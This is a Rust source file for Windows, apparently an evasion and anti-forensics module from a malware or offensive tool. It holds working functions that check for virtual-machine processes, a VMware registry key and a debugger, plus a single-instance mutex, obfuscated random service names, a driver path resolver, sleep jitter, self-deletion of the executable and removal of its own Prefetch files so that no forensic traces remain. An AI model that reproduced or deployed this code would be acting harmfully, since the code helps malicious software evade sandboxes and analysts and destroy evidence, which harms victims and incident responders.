

use std::mem;

use windows::core::PCWSTR;
use windows::Win32::Foundation::{CloseHandle, GENERIC_WRITE, GetLastError, HANDLE, WIN32_ERROR};
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
use windows::Win32::System::LibraryLoader::GetModuleFileNameW;
use windows::Win32::System::Registry::{
    RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY, HKEY_LOCAL_MACHINE, KEY_READ,
};
use windows::Win32::System::Threading::{CreateMutexW, GetCurrentProcessId};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, DeleteFileW, FILE_SHARE_DELETE, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING,
};
use windows::Win32::System::SystemInformation::GetTickCount64;

use crate::obf;

const VM_PROCESSES: &[&str] = &[
    "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "xenservice.exe",
    "vmsrvc.exe", "vmwaretray.exe", "vmwareuser.exe", "vmusrvc.exe",
    "prl_tools.exe", "prl_cc.exe",
];

const VM_REG_KEYS: &[(&str, &str)] = &[
    (r"SOFTWARE\VMware, Inc.\VMware Tools", "InstallPath"),
];

fn is_vm_process() -> bool {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    let snap = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
        Ok(h) => h,
        Err(_) => return false,
    };
    let mut e = PROCESSENTRY32W { dwSize: mem::size_of::<PROCESSENTRY32W>() as u32, ..Default::default() };
    if unsafe { Process32FirstW(snap, &mut e) }.is_err() {
        unsafe { let _ = CloseHandle(snap); }
        return false;
    }
    let mut found = false;
    loop {
        let name = String::from_utf16_lossy(
            &e.szExeFile[..e.szExeFile.iter().position(|&c| c == 0).unwrap_or(e.szExeFile.len())]
        ).to_lowercase();
        if VM_PROCESSES.iter().any(|&p| name == p) {
            found = true;
            break;
        }
        if unsafe { Process32NextW(snap, &mut e) }.is_err() { break; }
    }
    unsafe { let _ = CloseHandle(snap); }
    found
}

fn is_vm_registry() -> bool {
    let mut key: HKEY = HKEY::default();
    for (subkey, value) in VM_REG_KEYS {
        let wstr: Vec<u16> = subkey.encode_utf16().chain(Some(0)).collect();
        let err = unsafe {
            RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(wstr.as_ptr()),
                None,
                KEY_READ,
                &mut key,
            )
        };
        if err != WIN32_ERROR(0) { continue; }
        let vwstr: Vec<u16> = value.encode_utf16().chain(Some(0)).collect();
        let mut buf = [0u8; 256];
        let mut size = buf.len() as u32;
        let err = unsafe {
            RegQueryValueExW(
                key,
                PCWSTR(vwstr.as_ptr()),
                None,
                None,
                Some(buf.as_mut_ptr()),
                Some(&mut size),
            )
        };
        let _ = unsafe { RegCloseKey(key) };
        if err == WIN32_ERROR(0) { return true; }
    }
    false
}

pub fn detect_vm() -> bool {
    is_vm_process() || is_vm_registry()
}

pub fn detect_debugger() -> bool {
    unsafe { IsDebuggerPresent().as_bool() }
}

pub fn create_mutex(name: &str) -> Option<HANDLE> {
    let wstr: Vec<u16> = name.encode_utf16().chain(Some(0)).collect();
    match unsafe { CreateMutexW(None, false, PCWSTR(wstr.as_ptr())) } {
        Ok(h) => {
            if unsafe { GetLastError() }.0 == 183 {
                // ERROR_ALREADY_EXISTS
                let _ = unsafe { CloseHandle(h) };
                None
            } else {
                Some(h)
            }
        }
        Err(_) => None,
    }
}

pub fn random_service_name() -> String {
    let tick = unsafe { GetTickCount64() };
    let pid = unsafe { GetCurrentProcessId() };
    let r = (tick ^ pid as u64) & 0xFFFFFF;
    format!("{}{:06X}", obf::svc_prefix(), r)
}

pub fn resolve_driver_path(fname: &str) -> String {
    if std::path::Path::new(fname).is_absolute() {
        return fname.to_string();
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            let cand = dir.join(fname);
            if cand.exists() {
                return cand.to_string_lossy().to_string();
            }
        }
    }
    if let Ok(cwd) = std::env::current_dir() {
        let cand = cwd.join(fname);
        if cand.exists() {
            return cand.to_string_lossy().to_string();
        }
    }
    fname.to_string()
}

pub fn jitter_sleep(base_ms: u64, jitter_ms: u64) {
    let j = if jitter_ms > 0 {
        let tick = unsafe { GetTickCount64() };
        (tick % jitter_ms as u64) as u64
    } else {
        0
    };
    std::thread::sleep(std::time::Duration::from_millis(base_ms + j));
}

pub fn self_destruct(path: &str) {
    let wstr: Vec<u16> = path.encode_utf16().chain(Some(0)).collect();
    let h = unsafe {
        CreateFileW(
            PCWSTR(wstr.as_ptr()),
            GENERIC_WRITE.0,
            FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
    };
    if h.is_ok() {
        let _ = unsafe { DeleteFileW(PCWSTR(wstr.as_ptr())) };
    }
}

pub fn purge_prefetch() {
    let exe = own_exe_name();
    if let Ok(entries) = std::fs::read_dir(r"C:\Windows\Prefetch") {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_lowercase();
            if name.starts_with(&exe.trim_end_matches(".exe").to_lowercase()) && name.ends_with(".pf") {
                let _ = std::fs::remove_file(entry.path());
            }
        }
    }
}

fn own_exe_name() -> String {
    let mut buf = [0u16; 260];
    let len = unsafe { GetModuleFileNameW(None, &mut buf) } as usize;
    let wide = &buf[..len];
    let path = String::from_utf16_lossy(wide);
    std::path::Path::new(&path).file_name().unwrap_or_default().to_string_lossy().to_string()
}